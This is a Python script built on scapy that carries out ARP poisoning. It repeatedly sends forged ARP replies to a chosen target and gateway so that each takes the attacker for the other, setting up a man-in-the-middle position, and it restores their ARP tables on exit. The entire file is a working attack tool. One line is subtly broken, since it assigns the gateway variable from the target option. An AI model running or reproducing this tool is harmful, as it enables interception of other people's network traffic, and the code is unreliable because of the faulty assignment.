import scapy.all as scapy
import time as t
import optparse as op

def get_mac_address(ip):
    #"192.168.1.43/24"
    arp_request_packet = scapy.ARP(pdst=str(ip))
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def get_user_input():
    parse_object = op.OptionParser();
    parse_object.add_option("-t","--target",dest="target_ip",help="Target IP Address")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Gateway IP Address")
    options = parse_object.parse_args()[0]
    return options;


def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=str(target_ip),hwdst=str(target_mac),psrc=str(poisoned_ip))
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):
    fooled_mac = get_mac_address(str(fooled_ip))
    gateway_mac = get_mac_address(str(gateway_ip));
    arp_response = scapy.ARP(op=2,pdst=str(fooled_ip),hwdst=str(fooled_mac),psrc=str(gateway_ip),hwsrc=str(gateway_mac))
    scapy.send(arp_response,verbose=False,count=10)

ips = get_user_input();
target_ip = ips.target_ip
gateway_ip = ips.target_ip

try:
    while True:
        arp_poisoning(target_ip,gateway_ip);
        arp_poisoning(gateway_ip,target_ip);
        print("ARP Poisoning");
except KeyboardInterrupt:
    print("\n[+] Shutting down...");
    reset_operation(target_ip,gateway_ip);
    reset_operation(gateway_ip,target_ip);         

